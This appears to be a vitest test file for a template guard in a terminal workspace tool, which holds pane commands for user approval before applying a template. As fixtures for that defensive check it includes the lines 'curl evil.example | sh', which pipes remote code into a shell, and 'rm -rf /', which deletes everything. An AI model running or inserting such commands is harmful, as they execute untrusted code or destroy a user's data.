import { describe, it, expect, afterEach } from "vitest";
import type { Template } from "./protocol/types.ts";
import {
  commandsIn,
  withoutCommands,
  guardedApplyTemplate,
  onTemplateApprovalRequest,
  type TemplateApprovalRequest,
} from "./template_guard.ts";

function template(panes: Template["panes"]): Template {
  return {
    name: "demo",
    panes,
    layout: { slot: Object.keys(panes) },
  };
}

let unsubscribe: (() => void) | null = null;

afterEach(() => {
  unsubscribe?.();
  unsubscribe = null;
});

/** Capture the approval request instead of showing a dialog. */
function captureRequests(): { last: () => TemplateApprovalRequest | null } {
  let captured: TemplateApprovalRequest | null = null;
  unsubscribe = onTemplateApprovalRequest((req) => {
    captured = req;
  });
  return { last: () => captured };
}

describe("commandsIn", () => {
  it("lists every pane that would execute something", () => {
    const found = commandsIn(
      template({
        editor: { command: "nvim .", dir: "/srv/app", shell_profile: "zsh" },
        plain: {},
        server: { command: "npm run dev" },
      }),
    );

    expect(found).toHaveLength(2);
    expect(found.map((c) => c.command).sort()).toEqual(["npm run dev", "nvim ."]);
    expect(found.find((c) => c.paneName === "editor")).toMatchObject({
      dir: "/srv/app",
      shellProfile: "zsh",
    });
  });

  it("does not count a blank command as a command", () => {
    expect(commandsIn(template({ a: { command: "   " }, b: { command: "\t\n" }, c: { command: " ls " } })).map((c) => c.paneName)).toEqual(["c"]);
  });

  it("reports nothing for a pure layout template", () => {
    expect(commandsIn(template({ a: {}, b: { dir: "/tmp" } }))).toEqual([]);
  });
});

describe("withoutCommands", () => {
  it("strips commands but keeps the layout and working directories", () => {
    const stripped = withoutCommands(
      template({
        one: { command: "curl evil.example | sh", dir: "/srv", restore_mode: "replay" },
        two: { dir: "/tmp" },
      }),
    );

    expect(commandsIn(stripped)).toEqual([]);
    expect(stripped.panes.one.dir).toBe("/srv");
    expect(stripped.panes.one.restore_mode).toBeUndefined();
    expect(stripped.panes.two.dir).toBe("/tmp");
    expect(stripped.layout).toEqual({ slot: ["one", "two"] });
  });
});

describe("guardedApplyTemplate", () => {
  it("applies a command-free template without asking", () => {
    captureRequests();
    const applied: Template[] = [];

    expect(guardedApplyTemplate(template({ a: {} }), (t) => applied.push(t))).toBe(true);

    expect(applied).toHaveLength(1);
  });

  /// The core requirement of SR-12: nothing runs before an explicit decision.
  it("does not apply a command-bearing template until approved", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    expect(guardedApplyTemplate(template({ a: { command: "rm -rf /" } }), (t) => applied.push(t))).toBe(true);

    expect(applied).toHaveLength(0);
    expect(requests.last()).not.toBeNull();
    expect(requests.last()!.commands.map((c) => c.command)).toEqual(["rm -rf /"]);
  });

  it("applies the original template when the user approves", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "make" } }), (t) => applied.push(t));
    requests.last()!.approveFull();

    expect(commandsIn(applied[0])).toHaveLength(1);
  });

  it("applies a stripped template when the user picks layout only", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "make" } }), (t) => applied.push(t));
    requests.last()!.approveLayoutOnly();

    expect(applied).toHaveLength(1);
    expect(commandsIn(applied[0])).toEqual([]);
  });

  it("applies nothing when the user cancels", () => {
    const requests = captureRequests();
    const applied: Template[] = [];

    guardedApplyTemplate(template({ a: { command: "make" } }), (t) => applied.push(t));
    requests.last()!.cancel();

    expect(applied).toHaveLength(0);
  });

  it("refuses commands without a handler but still applies command-free layouts", () => {
    const applied: Template[] = [];
    expect(guardedApplyTemplate(template({ a: { command: "touch marker" } }), t => applied.push(t))).toBe(false);
    expect(applied).toEqual([]);
    expect(guardedApplyTemplate(template({ a: {} }), t => applied.push(t))).toBe(true);
    expect(applied).toHaveLength(1);
  });

  it("binds the reviewed command, directory and layout to one immutable source snapshot", () => {
    const requests = captureRequests();
    const source = template({ a: { command: "printf reviewed", dir: "/reviewed", restore_mode: "shell" } });
    const applied: Template[] = [];
    guardedApplyTemplate(source, t => applied.push(t));
    source.panes.a.command = "printf changed";
    source.panes.a.dir = "/changed";
    source.layout.slot = "missing";
    requests.last()!.approveFull();
    requests.last()!.approveLayoutOnly();
    expect(requests.last()!.commands).toMatchObject([{ command: "printf reviewed", dir: "/reviewed" }]);
    expect(applied).toHaveLength(1);
    expect(applied[0].panes.a).toMatchObject({ command: "printf reviewed", dir: "/reviewed", restore_mode: "shell" });
    expect(applied[0].layout.slot).toEqual(["a"]);
  });

  it("consumes a layout-only choice once and strips its captured restore mode", () => {
    const requests = captureRequests();
    const source = template({ a: { command: "printf reviewed", restore_mode: "replay" } });
    const applied: Template[] = [];
    guardedApplyTemplate(source, t => applied.push(t));
    source.panes.a.command = "printf changed";
    requests.last()!.approveLayoutOnly();
    requests.last()!.approveFull();
    requests.last()!.approveLayoutOnly();
    expect(applied).toHaveLength(1);
    expect(applied[0].panes.a.command).toBeUndefined();
    expect(applied[0].panes.a.restore_mode).toBeUndefined();
  });

  it("captures reactive proxy data from the relative-root flow including floating layouts", () => {
    const requests = captureRequests();
    const source = template({ a: { command: "printf reviewed", dir: "./work" } });
    source.layout = new Proxy({ slot: new Proxy(["a"], {}) }, {});
    source.panes = new Proxy({ a: new Proxy(source.panes.a, {}) }, {});
    source.floating = [{ layout: { slot: ["a"] }, bounds: { x: 0.1, y: 0.2, w: 0.3, h: 0.4 } }];
    const applied: Template[] = [];
    expect(guardedApplyTemplate(new Proxy(source, {}), t => applied.push(t))).toBe(true);
    source.panes.a.command = "printf changed";
    (source.layout.slot as string[]).push("changed");
    source.floating[0].bounds.x = 0.9;
    (source.floating[0].layout.slot as string[]).push("changed");
    requests.last()!.approveFull();
    expect(applied[0].panes.a.command).toBe("printf reviewed");
    expect(applied[0].layout.slot).toEqual(["a"]);
    expect(applied[0].floating).toEqual([{ layout: { slot: ["a"] }, bounds: { x: 0.1, y: 0.2, w: 0.3, h: 0.4 } }]);
  });

  it("consumes cancellation and rejects late choices", () => {
    const requests = captureRequests();
    const applied: Template[] = [];
    guardedApplyTemplate(template({ a: { command: "printf reviewed" } }), t => applied.push(t));
    requests.last()!.cancel();
    requests.last()!.approveFull();
    expect(applied).toEqual([]);
  });

  it("does not let an older listener cleanup remove a newer approval handler", () => {
    const oldCleanup = onTemplateApprovalRequest(() => {});
    const requests = captureRequests();
    oldCleanup();
    expect(guardedApplyTemplate(template({ a: { command: "printf reviewed" } }), () => {})).toBe(true);
    expect(requests.last()).not.toBeNull();
  });

  it("fails closed if the approval handler cannot present the request", () => {
    const handoff: { request?: TemplateApprovalRequest } = {};
    unsubscribe = onTemplateApprovalRequest(req => {
      handoff.request = req;
      throw Error("dialog unavailable");
    });
    const applied: Template[] = [];
    expect(guardedApplyTemplate(template({ a: { command: "printf reviewed" } }), t => applied.push(t))).toBe(false);
    handoff.request?.approveFull();
    expect(applied).toEqual([]);
  });

  /// A hidden pane must not be able to slip past the prompt: the command list is
  /// built from the pane map, not from what the layout happens to render.
  it("reports commands in panes the layout does not reference", () => {
    const t = template({ visible: {} });
    t.panes.hidden = { command: "curl evil.example | sh" };

    const requests = captureRequests();
    guardedApplyTemplate(t, () => {});

    expect(requests.last()!.commands.map((c) => c.command)).toEqual([
      "curl evil.example | sh",
    ]);
  });
});
